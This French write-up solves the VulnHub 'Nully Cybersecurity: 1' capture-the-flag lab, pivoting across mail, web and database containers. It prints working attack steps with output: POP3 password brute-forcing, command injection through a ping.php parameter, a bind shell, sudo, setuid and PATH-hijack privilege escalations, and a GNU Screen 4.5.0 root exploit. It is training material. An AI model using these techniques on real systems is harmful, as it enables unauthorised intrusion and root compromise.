# Solution du CTF Nully Cybersecurity de VulnHub

[Nully Cybersecurity: 1](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/) est un CTF créé par [laf3r](https://laf3r.github.io/) et disponible sur VulnHub. Ce CTF nous fait travailler nos compétences à pivoter de machine en machine donc sortez votre `reverse-ssh`, votre `Metasploit`, ssh ou autre et c'est parti !

```
Nmap scan report for 192.168.56.67
Host is up (0.00060s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome to the Nully Cybersecurity CTF
|_http-server-header: Apache/2.4.29 (Ubuntu)
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE CAPA TOP PIPELINING UIDL USER SASL(PLAIN LOGIN)
2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8dc1b0f50a3d1c32809114c53b04e13e (RSA)
|   256 cb22f4e3e1f1616858919a9619352cff (ECDSA)
|_  256 a5e34857495585f98c9ac18ca649f52d (ED25519)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
9000/tcp open  cslistener?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: max-age=31536000
|     Content-Length: 23203
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 22 Jul 2020 22:47:36 GMT
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 29 Nov 2022 21:11:38 GMT
|     <!DOCTYPE html
|     ><html lang="en" ng-app="portainer">
|     <head>
|     <meta charset="utf-8" />
|     <title>Portainer</title>
|     <meta name="description" content="" />
|     <meta name="author" content="Portainer.io" />
|     <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
|     <!--[if lt IE 9]>
|     <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
|     <![endif]-->
|     <!-- Fav and touch icons -->
|     <link rel="apple-touch-icon" sizes="180x180" href="dc4d092847be46242d8c013d1bc7c494.png" />
|_    <link rel="icon" type="image/png" sizes="32x32" href="5ba13dcb526292ae707310a54e103cd1.png"
```

J'ai eu la bonne idée de ne pas partir directement sur des services inconnus (pour une fois) car le site web indique qu'ils ne font pas partie du CTF :

> ### About:
> 
> This machine uses Docker and Portainer so don't attack 80, 8000 and 9000 ports.
> 
> Nully Security Company has 3 servers and your goal is to get root access on each of them.
> 
> Also give the machine 5-8 minutes to start all services.
> 
> ### Servers:
> 
> 1. Mail server.
> 2. Web server.
> 3. Database server.
> 
> ### Rules:
> 
> 1. Dont attack this port 80, 8000 and 9000 ports
> 2. Dont user kernel exploits
> 3. Dont bruteforce **root** passwords
> 
> ### Story:
> 
> You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.
> 
> To start, check your email on port 110 with authorization data `pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO`

Ok, 3 machines à rooter, trois flags, trois ambiances :)

## You got mail

C'était la bonne ocasion pour se connecter sur un serveur POP3 directement, sans utiliser un client spécialisé. Je me sers des identifiants donnés sur le site :

```shellsession
$ ncat -t 192.168.56.67 110
+OK Dovecot (Ubuntu) ready.
USER pentester
+OK
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
+OK Logged in.
LIST
+OK 1 messages:
1 657
.
RETR 1
+OK 657 octets
Return-Path: <root@MailServer>
X-Original-To: pentester@localhost
Delivered-To: pentester@localhost
Received: by MailServer (Postfix, from userid 0)
        id 20AE4A4C29; Tue, 25 Aug 2020 17:04:49 +0300 (+03)
Subject: About server
To: <pentester@localhost>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200825140450.20AE4A4C29@MailServer>
Date: Tue, 25 Aug 2020 17:04:49 +0300 (+03)
From: root <root@MailServer>

Hello,
I'm Bob Smith, the Nully Cybersecurity mail server administrator.
The boss has already informed me about you and that you need help accessing the server.
Sorry, I forgot my password, but I remember the password was simple.
.
QUIT
+OK Logging out.
```

Pauvre bob, allez on va l'aider à retrouver son mot de passe. Ca aurait pu être très long de bruteforcer le pop3 ou le ssh, heureusement un indice a été ajouté sur la page VulnHub du CTF :

> Hints: 'cat rockyou.txt | grep bobby > wordlist' for generating wordlist.

On s'exécute et on lance notre attaque :

```shellsession
$ hydra -l bob -P pass.txt -e nsr pop3://192.168.56.67/CLEAR
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-29 22:49:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2456 login tries (l:1/p:2456), ~154 tries per task
[DATA] attacking pop3://192.168.56.67:110/CLEAR
[STATUS] 81.00 tries/min, 81 tries in 00:01h, 2375 to do in 00:30h, 16 active
[STATUS] 64.33 tries/min, 193 tries in 00:03h, 2263 to do in 00:36h, 16 active
[STATUS] 59.57 tries/min, 417 tries in 00:07h, 2039 to do in 00:35h, 16 active
[110][pop3] host: 192.168.56.67   login: bob   password: bobby1985
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-29 22:58:46
```

L'URL donnée à `Hydra` force le programme à utiliser une authentification en clair (sans encodage base64 ni quelque chose de plus poussé). Ca a tout de même pris près de 10 minutes !

## Sudo au carré

L'utilisateur n'a pas d'emails mais bonne nouvelle, le mot de passe fonctionne aussi pour SSH :

```shellsession
bob@MailServer:~$ cat todo 
1. Install postfix and dovecot
2. Write a letter to the penetration tester about the server.
3. Write a script to check the server.
4. Create my2user to backup important data.(I think for security reasons I will back up important data with the help of another user)
```

Effectivement il y a un user `my2user`. bob aurait-il mené à bien toutes ses taches ?

`uid=1001(my2user) gid=1001(my2user) groups=1001(my2user)`

Ca semble être le cas car on retrouve un script à lui pour "checker" le serveur :

```shellsession
bob@MailServer:~$ ls -al /opt/scripts/check.sh
-rw-r--r-- 1 bob bob 1249 Aug 25  2020 /opt/scripts/check.sh
```

Le script en tant que tel ne fait rien de bien intéressant :

```bash
#!/bin/bash
echo "This is script for check security on the server by laf3r"
echo "Script runned as $USER"

echo "                    "

echo "Users on the server:"
echo "                    "

/usr/bin/cat /etc/passwd | grep root
/usr/bin/cat /etc/passwd | grep home
echo "--------------------"

echo "                    "
echo "Active services:"
echo "                    "

/usr/sbin/service --status-all | grep +

echo "--------------------"

echo "                    "
echo "Current network connections:"
echo "                    "

/usr/bin/netstat -A inet –program

echo "--------------------"

echo "                    "
echo "Check internet connection (ping goole.com)"

echo "                    "
if ping www.google.com &> /dev/null; then
    echo "Internet connection is active"
else
    echo "Internet connection is not available"
fi

echo "--------------------"

echo "                    "
echo "Active processes:"
echo "                    "

/usr/bin/ps -aux

echo "--------------------"

echo "                    "
echo "Web Server files: "

/usr/bin/ls -la /var/www/html

echo "--------------------"

echo "                    "
echo "List of disks:"
echo "                    "

/usr/bin/lsblk

echo "--------------------"
```

Ce qui nous intéresse c'est le fait que `bob` puisse le lancer avec l'autre compte :

```shellsession
bob@MailServer:~$ sudo -l
Matching Defaults entries for bob on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on MailServer:
    (my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh
```

Comme on a les droits d'écriture sur le script j'ai juste remplacé toutes les commandes présentes par `bash -i`.

Une fois connecté avec `my2user` on a une nouvelle entrée sudo à portée de main :

```shellsession
bob@MailServer:~$ sudo -u my2user /bin/bash /opt/scripts/check.sh
sudo: setrlimit(RLIMIT_CORE): Operation not permitted
my2user@MailServer:/home/bob$ id
uid=1001(my2user) gid=1001(my2user) groups=1001(my2user)
my2user@MailServer:/home/bob$ sudo -l
Matching Defaults entries for my2user on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User my2user may run the following commands on MailServer:
    (root) NOPASSWD: /usr/bin/zip
```

On trouve vite fait un [GTFObin](https://gtfobins.github.io/gtfobins/zip/) pour cette commande :

```shellsession
my2user@MailServer:~$ mkdir yolo; sudo /usr/bin/zip yolo /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 33%)
# id 
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
1_flag.txt
# cat 1_flag.txt

       .88888.                          dP           dP          dP       
      d8'   `88                         88           88          88       
      88        .d8888b. .d8888b. .d888b88           88 .d8888b. 88d888b. 
      88   YP88 88'  `88 88'  `88 88'  `88           88 88'  `88 88'  `88 
      Y8.   .88 88.  .88 88.  .88 88.  .88    88.  .d8P 88.  .88 88.  .88 
       `88888'  `88888P' `88888P' `88888P8     `Y8888'  `88888P' 88Y8888' 
      oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                                                                          
        Mail server is rooted.
        You got the first flag: 2c393307906f29ee7fb69e2ce59b4c8a
        Now go to the web server and root it.
```

## Oliver et compagnie

On est dans un container Docker avec l'IP `172.17.0.4`. Généralement les IPs de container ne vont pas bien loin dans les numéros c'est pour cela que je ne scanne que le /24 (note: `nmap` est déjà présent sur la machine) :

```shellsession
# nmap -p80 -T5 172.17.0.4/24
Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-30 01:15 +03
Nmap scan report for 172.17.0.1
Host is up (0.000048s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:D1:C9:E5:5C (Unknown)

Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE  SERVICE
80/tcp closed http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap scan report for 172.17.0.3
Host is up (0.000022s latency).

PORT   STATE  SERVICE
80/tcp closed http
MAC Address: 02:42:AC:11:00:03 (Unknown)

Nmap scan report for 172.17.0.5
Host is up (0.000028s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:05 (Unknown)

Nmap scan report for MailServer (172.17.0.4)
Host is up (0.000058s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap done: 256 IP addresses (5 hosts up) scanned in 14.53 seconds
```

Le `172.17.0.1` est très certainement l'hôte que l'on connait (donc non compris dans le CTF) ce qui nous laisse l'IP terminant par `.5` :

```shellsession
# curl 172.17.0.5
<html>
<head>
<title>Nully Cybersecurity</title>
</head>
<body>
<h1 align="center">Under Construction</h1>
<p>So, there should be a website here, but it's still under construction. -Oliver</p>
</body>
</html>
```

Je vais profiter du compte SSH de `bob` pour forwarder ce port en local :

```bash
ssh -p 2222 -N -L 8080:172.17.0.5:80 bob@192.168.56.67
```

Puis je lance une énumération qui ne met pas longtemps à ramener quelque chose :

```shellsession
$ feroxbuster -u http://127.0.0.1:8080/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://127.0.0.1:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      312c http://127.0.0.1:8080/ping
403        9l       28w      276c http://127.0.0.1:8080/server-status
200        9l       24w      209c http://127.0.0.1:8080/
[####################] - 39s    62260/62260   0s      found:3       errors:0      
[####################] - 38s    62260/62260   1609/s  http://127.0.0.1:8080/
```

Dans le dossier `ping` sur lequel le listing est activé je trouve un script `ping.php` qui m'indique :

```html
Use the host parameter<pre>Array ( ) </pre>
```

Je m'exécute non sans deviner un échappement de commande  :

http://127.0.0.1:8080/ping/ping.php?host=;id

```html
Use the host parameter<pre>Array ( [0] => uid=33(www-data) gid=33(www-data) groups=33(www-data) ) </pre>
```

J'ai rappatrié `reverse-ssh` sur `WebServer` et je l'ai exécuté en mode bind (qui écoute par défaut sur le port `31337`) :

```bash
nohup ./reverse-sshx64
```

Je m'y connecte depuis `MailServer` :

```shellsession
root@MailServer:/root# ssh -p 31337 172.17.0.5
The authenticity of host '[172.17.0.5]:31337 ([172.17.0.5]:31337)' can't be established.
RSA key fingerprint is SHA256:Mi6GInNEYmXViUaaf2Gf8q1DXoQb/RAUgA2gquh3R1A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.17.0.5]:31337' (RSA) to the list of known hosts.
root@172.17.0.5's password: 
www-data@WebServer:/var/www/html/ping$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
oscar:x:1000:1000:Oscar White,,,,I am sysadmin of the Nully Cybersecurity web server:/home/oscar:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
oliver:x:1001:1001:Oliver Jackson,,,,I am in charge of the website and web applications:/home/oliver:/bin/bash
messagebus:x:102:104::/nonexistent:/usr/sbin/nologin
```

J'ai pris l'habitude de jeter un oeil dans `/var/backups` comme l'aurait fait `LinPEAS` :

```shellsession
www-data@WebServer:/var$ ls backups/
total 16K
drwxr-xr-x 1 root   root   4.0K Aug 26  2020 .
drwxr-xr-x 1 root   root   4.0K Aug 25  2020 ..
-rwxrwxrwx 1 oliver oliver   63 Aug 26  2020 .secret
www-data@WebServer:/var$ cat backups/.secret 
Dont forget
my password - 4hppfvhb9pW4E4OrbMLwPETRgVo2KyyDTqGF
```

J'ai aussi pris l'habitude de créer un alias pour la commande `ls`, ce qui explique que les fichiers cachés apparaissent :

```bash
alias ls="ls -alh --color"
```

Fouillons les fichier d'`Oscar`, le `sysadmin of the Nully Cybersecurity web server` :

```shellsession
oliver@WebServer:~$ find / -user oscar -ls 2> /dev/null 
   680142      4 drwx------   4 oscar    oscar        4096 Aug 26  2020 /home/oscar
   678796   5332 -rwsr-xr-x   1 oscar    oscar     5457568 Aug 26  2020 /usr/bin/python3
   678522   5332 -rwxr-xr-x   1 oscar    oscar     5457568 Mar 13  2020 /usr/bin/python3.8
```

Ce petit `s` dans les permissions indique que le fichier est setuid. `Oscar` a l'UID `1000` on va l'appliquer au process courant (UIDs effectif et réel) puis lancer un nouveau shell :

```shellsession
oliver@WebServer:~$ /usr/bin/python3
Python 3.8.2 (default, Mar 13 2020, 10:14:16) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setreuid(1000, 1000)
>>> os.system("bash -p")
oscar@WebServer:~$ id
uid=1000(oscar) gid=1001(oliver) groups=1001(oliver)
oscar@WebServer:~$ pwd
/home/oliver
oscar@WebServer:~$ cd ~oscar
oscar@WebServer:/home/oscar$ ls -al
total 36
drwx------ 4 oscar oscar 4096 Aug 26  2020 .
drwxr-xr-x 1 root  root  4096 Aug 26  2020 ..
-rw------- 1 oscar oscar    0 Nov 29 22:39 .bash_history
-rw-r--r-- 1 oscar oscar  220 Aug 25  2020 .bash_logout
-rw-r--r-- 1 oscar oscar 3771 Aug 25  2020 .bashrc
drwx------ 2 oscar oscar 4096 Aug 25  2020 .cache
-rw-r--r-- 1 oscar oscar  807 Aug 25  2020 .profile
-rw------- 1 oscar oscar 2183 Aug 26  2020 .viminfo
-r-------- 1 oscar oscar   37 Aug 26  2020 my_password
drwx------ 2 oscar oscar 4096 Aug 27  2020 scripts
oscar@WebServer:/home/oscar$ cat my_password 
H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o
```

Une fois connecté avec ce mot de passe on trouve dans le dossier `scripts` de l'utilisateur un binaire setuid pour root :

```shellsession
oscar@WebServer:/home/oscar$ ls -al scripts/
total 28
drwx------ 2 oscar oscar  4096 Aug 27  2020 .
drwx------ 4 oscar oscar  4096 Aug 26  2020 ..
-rwsr-xr-x 1 root  root  16784 Aug 26  2020 current-date
oscar@WebServer:/home/oscar$ strings scripts/current-date 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
date
:*3$"
GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
crtstuff.c
--- snip ---
```

Le programme fait un setuid pour nous puis exécute `date` mais sans vérifier le path :

```shellsession
oscar@WebServer:/home/oscar$ cp /usr/bin/dash date
oscar@WebServer:/home/oscar$ export PATH=.:$PATH
oscar@WebServer:/home/oscar$ ./scripts/current-date
# id
uid=0(root) gid=0(root) groups=0(root),1001(oliver)
# cd /root
# ls
2_flag.txt
# cat 2_flag.txt
 __          __  _ _       _                  
 \ \        / / | | |     | |                 
  \ \  /\  / /__| | |   __| | ___  _ __   ___ 
   \ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \
    \  /\  /  __/ | | | (_| | (_) | | | |  __/
     \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___|
                                              
                                             
Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
Now go to the Database server.
```

## NoDatabaseServer

Qu'est-ce qu'il nous reste ? `172.17.0.3` ?

```shellsession
# nmap -p- -T5 172.17.0.3
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 172.17.0.3
Host is up (0.000017s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
MAC Address: 02:42:AC:11:00:03 (Unknown)
```

Pas de serveur de base de données en écoute mais il y a ce FTP :

```shellsession
# ftp 172.17.0.3 
Connected to 172.17.0.3.
220 (vsFTPd 3.0.3)
Name (172.17.0.3:root): anonymous 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 27  2020 .folder
-rw-r--r--    1 ftp      ftp             0 Aug 27  2020 test
226 Directory send OK.
ftp> cd .folder
250 Directory successfully changed.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 27  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 27  2020 ..
-rw-r--r--    1 ftp      ftp           224 Aug 27  2020 .backup.zip
-rw-r--r--    1 ftp      ftp            15 Aug 27  2020 file.txt
226 Directory send OK.
ftp> get file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for file.txt (15 bytes).
226 Transfer complete.
15 bytes received in 0.00 secs (7.0902 kB/s)
ftp> get .backup.zip
local: .backup.zip remote: .backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .backup.zip (224 bytes).
226 Transfer complete.
224 bytes received in 0.01 secs (21.1230 kB/s)
ftp> 221 Goodbye.
```

Malheureusement `unzip` n'est pas présent dans le container. Je ne suis pas pris la tête pour le transférer via le réseau : le fichier fait 224 octets, je l'ai encodé en base64, copié le résultat et décodé sur ma machine.

Comme on pouvait s'y attendre sur un CTF l'archive zip est protégée par mot de passe mais ne fait pas long feu face à `JohnTheRipper` :

```shellsession
$ ./zip2john backup.zip 
ver 1.0 efh 5455 efh 7875 backup.zip/creds.txt PKZIP Encr: 2b chk, TS_chk, cmplen=40, decmplen=28, crc=AB63D58D ts=4C65 cs=4c65 type=0
backup.zip/creds.txt:$pkzip$1*2*2*0*28*1c*ab63d58d*0*43*0*28*4c65*0374cf496a0debff4239547ddbda0bdc291aab499ba7374cb2dda67ee835f8d9050b58ea0cda4115*$/pkzip$:creds.txt:backup.zip::/tmp/backup.zip
```

```shellsession
$ ./john --wordlist=.rockyou.txt /tmp/hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
1234567890       (backup.zip/creds.txt)     
1g 0:00:00:00 DONE
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Dans le fichier `creds.txt` extrait on trouve des identifiants :

`donald:HBRLoCZ0b9NEgh8vsECS`

Je forwarde le port de cette nouvelle machine :

```bash
ssh -p 2222 -N -L 22222:172.17.0.3:22 bob@192.168.56.67
```

`LinPEAS` y trouve un fichier binaire setuid inhabituel :

`-rwsr-xr-x 1 root root 1.8M Aug 27  2020 /usr/bin/screen-4.5.0 (Unknown SUID binary)`

Il y a un [GTFObin concernant screen](https://gtfobins.github.io/gtfobins/screen/) :

```shellsession
donald@DatabaseServer:~$ /usr/bin/screen-4.5.0 -D -m -L /etc/zozo echo -ne  "This is dope"
donald@DatabaseServer:~$ cat /etc/zozo
This is dopedonald@DatabaseServer:~$ ls -al /etc/zozo
-rw-rw-r-- 1 root donald 12 Nov 30 07:03 /etc/zozo
```

On peut écrire des fichiers en tant que root mais quand j'ai tenté de rajouter une entrée à `/root/.ssh/authorized_keys` j'ai eu une erreur.

Je me suis tourné vers [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154), un code présent sur exploit-db. Il aura uniquement fallu modifier le path pour screen. Heureusement `gcc` était présent sur le système sans quoi ça aurait été plus laborieux (le script contient du code C qu'il compile à la volée) :

```shellsession

donald@DatabaseServer:~$ ./screen_exploit.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
There is a screen on:
        9728.pts-1.DatabaseServer       (Attached)
1 Socket in /tmp/screens/S-donald.
# id
uid=0(root) gid=0(root) groups=0(root),1000(donald)
# cd /root
# ls
3_flag.txt
# cat 3_flag.txt

    _  _   _____             _           _ _ 
  _| || |_|  __ \           | |         | | |
 |_  __  _| |__) |___   ___ | |_ ___  __| | |
  _| || |_|  _  // _ \ / _ \| __/ _ \/ _` | |
 |_  __  _| | \ \ (_) | (_) | ||  __/ (_| |_|
   |_||_| |_|  \_\___/ \___/ \__\___|\__,_(_)

   6cb25d4789cdd7fa1624e6356e0d825b                                            

Congratulations on getting the final flag! 
You completed the Nully Cybersecurity CTF.
I will be glad if you leave a feedback. 


Twitter https://twitter.com/laf3r_
Discord laf3r#4754
```

Et sur `172.17.0.2` il y avait quoi du coup ?

```
Nmap scan report for 172.17.0.2
Host is up (0.00022s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
8000/tcp open  http-alt
9000/tcp open  cslistener
```

On retrouve les deux services du début qui ne font pas partie du CTF. La machine hôte les forward très certainement.

Un CTF sympathique mais il aurait gagné à ce que les différents containers ne soient pas au même niveau (tous accessibles depuis le premier container).


